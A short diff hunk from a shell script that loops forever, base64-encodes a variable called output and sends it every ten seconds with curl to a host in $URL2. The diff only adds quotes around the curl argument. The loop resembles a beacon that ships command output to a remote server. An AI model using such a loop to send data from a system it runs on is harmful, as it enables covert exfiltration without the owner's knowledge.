@@ -12,6 +12,6 @@ while true; do
     #echo $current_content
     # Encode the output in Base64
     base64_output=$(echo "$output" | base64)
-    curl -S -s $URL2/$base64_output
+    curl -S -s "$URL2/$base64_output"
     sleep 10
 done
